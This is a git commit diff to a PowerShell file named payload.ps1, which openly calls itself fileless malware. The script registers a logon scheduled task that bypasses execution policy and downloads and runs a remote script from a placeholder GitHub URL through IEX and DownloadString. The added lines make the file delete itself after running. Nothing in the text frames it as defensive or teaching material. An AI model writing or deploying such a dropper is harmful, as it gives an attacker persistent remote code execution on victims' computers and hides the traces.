77a5db827227aeacbf8f5e8e77be0c9c925c5fac
melissa172714 <146184999+melissa172714@users.noreply.github.com>
2024-12-04 17:11:53 +0100

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -6,3 +6,8 @@ $TaskName = "FilelessMalwareTask"
 $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/payload.ps1')"
 $TaskTrigger = New-ScheduledTaskTrigger -AtLogon
 Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -TaskName $TaskName -Description "Executes a fileless script at logon"
+
+ # Suppression automatique du script après exécution
+Start-Sleep -Seconds 2  # Petite pause pour garantir que toutes les tâches précédentes sont terminées
+Remove-Item -Path $MyInvocation.MyCommand.Path -Force
+
